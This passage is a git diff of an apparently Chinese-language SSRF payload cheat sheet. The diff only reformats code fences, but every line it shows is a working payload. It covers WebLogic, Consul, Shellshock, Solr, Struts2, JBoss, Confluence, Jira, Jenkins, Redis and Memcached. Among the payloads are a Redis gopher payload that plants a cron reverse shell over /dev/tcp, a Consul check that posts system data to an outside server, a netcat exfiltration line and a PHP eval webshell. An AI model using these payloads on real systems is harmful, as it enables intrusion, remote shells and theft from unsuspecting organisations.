@@ -63,7 +63,7 @@ cve-2021-40438
 
 CVE-2014-4210
 
-```http
+```
 POST /uddiexplorer/SearchPublicRegistries.jsp HTTP/1.1
 Host: target.com
 Content-Length: 137
@@ -73,12 +73,12 @@ operator=http%3A%2F%2FSSRF_CANARY&rdoSearch=name&txtSearchname=test&txtSearchkey
 ```
 
 GET
-```http
+```
 http://target.com/uddiexplorer/SearchPublicRegistries.jsp?operator=http%3A%2F%2FSSRF_CANARY&rdoSearch=name&txtSearchname=test&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search
 ```
 
 CRLF
-```http
+```
 GET /uddiexplorer/SearchPublicRegistries.jsp?operator=http://attacker.com:4000/exp%20HTTP/1.11%0AX-CLRF%3A%20Injected%0A&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search HTTP/1.0
 Host: vuln.weblogic
 Accept-Encoding: gzip, deflate
@@ -109,7 +109,7 @@ Connection: Keep-Alive
 CVE-2020-14883
 
 Linux:
-```http
+```
 POST /console/css/%252e%252e%252fconsole.portal HTTP/1.1
 Host: vulnerablehost:7001
 Upgrade-Insecure-Requests: 1
@@ -125,7 +125,7 @@ _nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.su
 ```
 
 Windows:
-```http
+```
 POST /console/css/%252e%252e%252fconsole.portal HTTP/1.1
 Host: vulnerablehost:7001
 Upgrade-Insecure-Requests: 1
@@ -144,7 +144,7 @@ _nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.su
 
 常用绑定端口 8500 8501
 
-```http
+```
 http://127.0.0.1:8500/? HTTP/1.1\r\nConnection: keep-alive\r\nHost: example.org\r\nContent-Length: 1\r\n\r\n1\r\nPUT /v1/agent/check/register HTTP/1.1\r\nHost: example.org\r\nContent-Length: 195\r\n\r\n\u007B\u0022id\u0022: \u0022BugCrowdDarkarnium\u0022,\u0022name\u0022: \u0022BugCrowdDarkarnium\u0022,\u0022script\u0022: \u0022/bin/uname -a | /usr/bin/curl -k -XPOST -d @- https://some-server/writer/writer.php?f=uname\u0022,\u0022interval\u0022: \u002260s\u0022,\u0022timeout\u0022: \u00225s\u0022\u007D
 ```
 
@@ -155,7 +155,7 @@ http://127.0.0.1:8500/? HTTP/1.1\r\nConnection: keep-alive\r\nHost: example.org\
 为了有效地测试Shellshock，需要添加包含有效负载的标头，[访问](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/tree/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/payloads/shellshock-cgi-paths.txt)即可查看CGI路径列表。
 
 通过用户代理进行Shellshock
-```http
+```
 User-Agent: () { foo;}; echo Content-Type: text/plain ; echo ;  curl SSRF_CANARY
 ```
 
@@ -164,7 +164,7 @@ User-Agent: () { foo;}; echo Content-Type: text/plain ; echo ;  curl SSRF_CANARY
 常用绑定端口 80 8080 8888 8082
 
 查看以下路径是否返回200状态码
-```http
+```
 /status/selfDiscovered/status
 /druid/coordinator/v1/leader
 /druid/coordinator/v1/metadata/datasources
@@ -172,13 +172,13 @@ User-Agent: () { foo;}; echo Content-Type: text/plain ; echo ;  curl SSRF_CANARY
 ```
 
 关闭任务，需要猜测任务ID或数据源名称
-```http
+```
 /druid/indexer/v1/task/{taskId}/shutdown
 /druid/indexer/v1/datasources/{dataSource}/shutdownAllTasks
 ```
 
 关闭Apache Druid Overlords主管
-```http
+```
 /druid/indexer/v1/supervisor/terminateAll
 /druid/indexer/v1/supervisor/{supervisorId}/shutdown
 ```
@@ -187,7 +187,7 @@ User-Agent: () { foo;}; echo Content-Type: text/plain ; echo ;  curl SSRF_CANARY
 
 常用绑定端口 8983
 
-```http
+```
 /search?q=Apple&shards=http://SSRF_CANARY/solr/collection/config%23&stream.body={"set-property":{"xxx":"yyy"}}
 /solr/db/select?q=orange&shards=http://SSRF_CANARY/solr/atom&qt=/select?fl=id,name:author&wt=json
 /xxx?q=aaa%26shards=http://SSRF_CANARY/solr
@@ -195,7 +195,7 @@ User-Agent: () { foo;}; echo Content-Type: text/plain ; echo ;  curl SSRF_CANARY
 ```
 
 Apache Solr 7.0.1 XXE
-```http
+```
 /solr/gettingstarted/select?q={!xmlparser v='<!DOCTYPE a SYSTEM "http://SSRF_CANARY/xxx"'><a></a>'
 /xxx?q={!type=xmlparser v="<!DOCTYPE a SYSTEM 'http://SSRF_CANARY/solr'><a></a>"}
 ```
@@ -218,7 +218,7 @@ GET /solr/db/dataimport?command=full-import&dataConfig=%3c%64%61%74%61%43%6f%6e%
 常用绑定端口 80 443
 
 XXE
-```http
+```
 POST /PSIGW/HttpListeningConnector HTTP/1.1
 Host: website.com
 Content-Type: application/xml
@@ -255,7 +255,7 @@ Content-Type: application/xml
 ```
 
 XXE
-```http
+```
 POST /PSIGW/PeopleSoftServiceListeningConnector HTTP/1.1
 Host: website.com
 Content-Type: application/xml
@@ -269,7 +269,7 @@ Content-Type: application/xml
 常用绑定端口 80 443 8080 8443
 
 Struts2-016
-```http
+```
 ?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'command'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23t%3d%23d.readLine(),%23u%3d"http://SSRF_CANARY/result%3d".concat(%23t),%23http%3dnew%20java.net.URL(%23u).openConnection(),%23http.setRequestMethod("GET"),%23http.connect(),%23http.getInputStream()}
 ```
 
@@ -278,7 +278,7 @@ Struts2-016
 常用绑定端口 80 443 8080 8443
 
 从URL部署WAR
-```http
+```
 /jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service=MainDeployer&methodIndex=17&arg0=http://SSRF_CANARY/utils/cmd.war
 ```
 
@@ -287,7 +287,7 @@ Struts2-016
 常用绑定端口 80 443 8080 8443
 
 CVE-2021-26084
-```http
+```
 /pages/createpage-entervariables.action?queryString=aaa%5Cu0027%252b%23%7B%5Cu0022%5Cu0022%5B%5Cu0022class%5Cu0022%5D.forName(%5Cu0022java.lang.Runtime%5Cu0022).getMethod(%5Cu0022getRuntime%5Cu0022%2Cnull).invoke(null%2Cnull).exec(%5Cu0022curl%20%3Cinstance%3E.burpcollaborator.net%5Cu0022)%7D%252b%5Cu0027
 /confluence/pages/createpage-entervariables.action?queryString=aaa%5Cu0027%252b%23%7B%5Cu0022%5Cu0022%5B%5Cu0022class%5Cu0022%5D.forName(%5Cu0022java.lang.Runtime%5Cu0022).getMethod(%5Cu0022getRuntime%5Cu0022%2Cnull).invoke(null%2Cnull).exec(%5Cu0022curl%20%3Cinstance%3E.burpcollaborator.net%5Cu0022)%7D%252b%5Cu0027
 /wiki/pages/createpage-entervariables.action?queryString=aaa%5Cu0027%252b%23%7B%5Cu0022%5Cu0022%5B%5Cu0022class%5Cu0022%5D.forName(%5Cu0022java.lang.Runtime%5Cu0022).getMethod(%5Cu0022getRuntime%5Cu0022%2Cnull).invoke(null%2Cnull).exec(%5Cu0022curl%20%3Cinstance%3E.burpcollaborator.net%5Cu0022)%7D%252b%5Cu0027
@@ -301,12 +301,12 @@ CVE-2021-26084
 ```
 
 共享链接(2016年11月及更早版本)
-```http
+```
 /rest/sharelinks/1.0/link?url=https://SSRF_CANARY/
 ```
 
 CVE-2017-9506
-```http
+```
 /plugins/servlet/oauth/users/icon-uri?consumerUri=http://SSRF_CANARY
 ```
 
@@ -315,12 +315,12 @@ CVE-2017-9506
 常用绑定端口 80 443 8080 8443
 
 CVE-2017-9506
-```http
+```
 /plugins/servlet/oauth/users/icon-uri?consumerUri=http://SSRF_CANARY
 ```
 
 CVE-2019-8451
-```http
+```
 /plugins/servlet/gadgets/makeRequest?url=https://SSRF_CANARY:443@example.com
 ```
 
@@ -336,7 +336,7 @@ CVE-2017-9506
 + Crucible < 4.3.2</br>
 + Fisheye < 4.3.2</br>
 
-```http
+```
 /plugins/servlet/oauth/users/icon-uri?consumerUri=http://SSRF_CANARY
 ```
 
@@ -345,12 +345,12 @@ CVE-2017-9506
 常用绑定端口 4242
 
 curl RCE
-```http
+```
 /q?start=2016/04/13-10:21:00&ignore=2&m=sum:jmxdata.cpu&o=&yrange=[0:]&key=out%20right%20top&wxh=1900x770%60curl%20SSRF_CANARY%60&style=linespoint&png
 ```
 
 CVE-2020-35476
-```http
+```
 /q?start=2016/04/13-10:21:00&ignore=2&m=sum:jmxdata.cpu&o=&yrange=[0:]&key=out%20right%20top&wxh=1900x770%60curl%20SSRF_CANARY%60&style=linespoint&png
 ```
 
@@ -360,17 +360,17 @@ CVE-2020-35476
 
 CVE-2018-1000600
 
-```http
+```
 /securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword?apiUrl=http://SSRF_CANARY/%23&login=orange&password=tsai
 ```
 
 RCE
-```http
+```
 /org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0a@GrabResolver(name='orange.tw', root='http://SSRF_CANARY/')%0a@Grab(group='tw.orange', module='poc', version='1')%0aimport Orange;
 ```
 
 Groovy RCE
-```http
+```
 cmd = 'curl burp_collab'
 pay = 'public class x {public x(){"%s".execute()}}' % cmd
 data = 'http://jenkins.internal/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=' + urllib.quote(pay)
@@ -381,7 +381,7 @@ data = 'http://jenkins.internal/descriptorByName/org.jenkinsci.plugins.scriptsec
 常用绑定端口 80 443 8080
 
 CVE-2020-5412
-```http
+```
 /proxy.stream?origin=http://SSRF_CANARY/
 ```
 
@@ -420,7 +420,7 @@ echo($req);
 常用绑定端口 2375 2376
 
 验证Docker的API是否存在
-```http
+```
 /containers/json
 /secrets
 /services
@@ -441,7 +441,7 @@ Content-Type: application/json
 常用绑定端口 9121
 
 该漏洞印象13.1.1之前版本的Gitlab实例，以下端点允许攻击者转储通过目标参数提供的Redis服务器中的所有密钥
-```http
+```
 http://localhost:9121/scrape?target=redis://127.0.0.1:7001&check-keys=*
 ```
 
@@ -461,7 +461,7 @@ redis-cli -h $1 save
 ```
 
 Gopher
-```http
+```
 gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/172.19.23.228/2333 0>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a
 ```
 
@@ -541,7 +541,7 @@ if __name__=="__main__":
 ```
 
 通过Git协议对Gitlab进行RCE
-```http
+```
 git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque%3Agitlab%3Aqueues%20system%5Fhook%5Fpush%0D%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem%5Fhook%5Fpush%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class%5Feval%5C%22%2C%5C%22open%28%5C%27%7Ccat%20%2Fflag%20%7C%20nc%20127%2E0%2E0%2E1%202222%5C%27%29%2Eread%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system%5Fhook%5Fpush%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created%5Fat%5C%22%3A1513714403%2E8122594%2C%5C%22enqueued%5Fat%5C%22%3A1513714403%2E8129568%7D%22%0D%0A%20exec%0D%0A%20exec%0D%0A/ssrf123321.git
 ```
 
@@ -549,7 +549,7 @@ git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque%3Agit
 
 常用绑定端口 11211
 
-```http
+```
 gopher://[target ip]:11211/_%0d%0aset ssrftest 1 0 147%0d%0aa:2:{s:6:"output";a:1:{s:4:"preg";a:2:{s:6:"search";s:5:"/.*/e";s:7:"replace";s:33:"eval(base64_decode($_POST[ccc]));";}}s:13:"rewritestatus";i:1;}%0d%0a
 gopher://192.168.10.12:11211/_%0d%0adelete ssrftest%0d%0a
 ```
